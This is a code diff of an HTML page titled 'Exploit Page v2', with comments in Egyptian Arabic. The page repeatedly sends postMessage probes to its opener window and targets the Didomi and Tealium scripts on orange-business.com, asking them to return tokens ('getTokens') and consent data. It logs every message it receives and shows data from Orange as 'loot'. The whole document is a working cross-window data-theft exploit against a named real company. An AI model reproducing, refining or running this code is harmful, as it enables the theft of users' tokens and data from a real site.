@@ -1,42 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Page</title>
+    <title>Exploit Page v2</title>
 </head>
-<body>
-    <h1>Waiting for Orange Data...</h1>
-    <p>Please check the console.</p>
+<body style="background-color: #111; color: #0f0; font-family: monospace;">
+    <h1>Listening for Targets...</h1>
+    <p>Check the console for raw data.</p>
+    <div id="loot"></div>
 
     <script>
-        // 1. إنشاء "رادار" لاستقبال الردود من موقع Orange
+        // 1. الرادار: هيطبع أي حاجة توصل من أي موقع عشان نعرف الخلل فين
         window.addEventListener("message", (event) => {
-            // عشان نتأكد إن الرد جاي من أورانج فعلاً
+            // هنطبع في الكونسول أي رسالة توصل أياً كان مصدرها
+            console.log("📥 Raw Message Caught!");
+            console.log("Origin:", event.origin);
+            console.log("Data:", event.data);
+
+            // لو الرسالة جاية من أورانج، هنعرضها على الشاشة
             if (event.origin.includes("orange-business.com")) {
-                console.log("🔥 BINGO! Loot Exfiltrated from Orange 🔥");
-                console.log("Data Received:", event.data);
-                
-                // هنطبع الداتا على الشاشة عشان تصورها فيديو بسهولة
-                document.body.innerHTML += "<pre style='color:green;'>" + JSON.stringify(event.data, null, 2) + "</pre>";
+                document.getElementById("loot").innerHTML += 
+                    "<h2>🔥 BINGO! Data Leaked:</h2><pre>" + 
+                    JSON.stringify(event.data, null, 2) + "</pre><hr>";
             }
         });
 
-        // 2. إرسال "طُعم" لموقع أورانج عشان نجبره يرد علينا
-        // هنبعت كل ثانية لحد ما يصطاد الرد
+        // 2. إرسال حزمة من الأوامر القياسية اللي الأنظمة دي بتستجيب ليها
         setInterval(() => {
             if (window.opener) {
-                // الطُعم بتاع Didomi SDK
+                // محاولة 1: استدعاء دالة getTokens اللي لقيناها في الكود
                 window.opener.postMessage({
                     "__didomiCall": {
-                        "callId": Date.now().toString(), 
-                        "type": "group", 
+                        "callId": Date.now().toString(),
+                        "type": "group",
+                        "call": "getTokens", 
                         "params": {}
                     }
                 }, "*");
-                
-                // الطُعم بتاع Tealium (utag.js)
-                window.opener.postMessage("didomi-ready", "*");
+
+                // محاولة 2: أمر Didomi القياسي
+                window.opener.postMessage(JSON.stringify({ 
+                    didomiIframeMessage: true, 
+                    action: "getConsentData" 
+                }), "*");
+
+                // محاولة 3: أمر Tealium القياسي
+                window.opener.postMessage("tealium-ready", "*");
             }
-        }, 1000);
+        }, 1500);
     </script>
 </body>
 </html>
